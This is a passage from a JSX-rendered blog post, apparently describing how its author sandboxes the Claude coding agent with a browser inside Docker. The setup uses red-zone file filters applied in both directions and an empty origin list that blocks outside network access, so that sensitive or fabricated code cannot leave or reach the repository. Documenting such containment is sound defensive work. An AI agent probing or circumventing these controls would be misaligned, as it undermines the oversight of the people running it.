        <div className="border-l-4 border-purple-500 pl-6 py-2">
          <p className="text-purple-300 font-semibold mb-2">Read whose error it is before believing what it says</p>
          <p className="text-slate-400">
            Three separate failures all surfaced as "needs authentication". None was an auth problem. The body always
            named the real source — a proxy, the MCP server, or Chromium itself.
          </p>
        </div>

        <div className="border-l-4 border-pink-500 pl-6 py-2">
          <p className="text-pink-300 font-semibold mb-2">Apply the same filter in both directions</p>
          <p className="text-slate-400">
            Red-zone rules strip files on the way in and block them on the way out. That one symmetry is what makes
            stub generation safe: a fabricated implementation cannot reach the repo, no matter how convincing it looks.
          </p>
        </div>

        <div className="border-l-4 border-cyan-500 pl-6 py-2">
          <p className="text-cyan-300 font-semibold mb-2">The tightest configuration is also the most useful one</p>
          <p className="text-slate-400">
            An empty origin list with a dev server inside the sandbox denies every destination outside Docker — and it
            is exactly the setup that lets Claude verify its own UI work. Security and usefulness pointed the same way
            here, which does not happen often enough to waste.
          </p>
        </div>

        <div className="border-l-4 border-blue-500 pl-6 py-2">
          <p className="text-blue-300 font-semibold mb-2">Fail the build, not the container</p>
          <p className="text-slate-400">
            Verifying the entrypoint exists at build time turned a silent "no such file or directory" into an error
            that explains itself. Checks belong as early as they can be made.
          </p>
        </div>
      </div>

      <h2 className="text-3xl font-bold text-cyan-400 mt-12 mb-6">Closing</h2>
      <p className="mb-6">
        The browser is off by default, and I think that is the right default. Most blue-zone work does not need one,
        and a session with no browser is a session with one fewer way for the code under review to leave.
      </p>
      <p className="mb-6">
        But the case it enables is real: Claude writes a component, stubs whatever red-zone module the component
        imports, starts webpack, opens the page in a Chromium that can reach that page and nothing else, and looks at
        what it built. The stub dies with the container. The manifest and the type contracts gave it enough shape to
        write something plausible, and the red-zone filter guarantees the plausible thing never reaches my repository.
      </p>
      <p className="mb-6">
        If you are running an AI coding agent against a codebase you cannot fully expose, this is worth trying — with
        the origin list empty and the dev server inside the sandbox. Add external origins only when a task genuinely
        needs them, and keep the list to hosts you control.
      </p>
    </>
  );
}

export default PlaywrightBlueZoneClaudeCode;
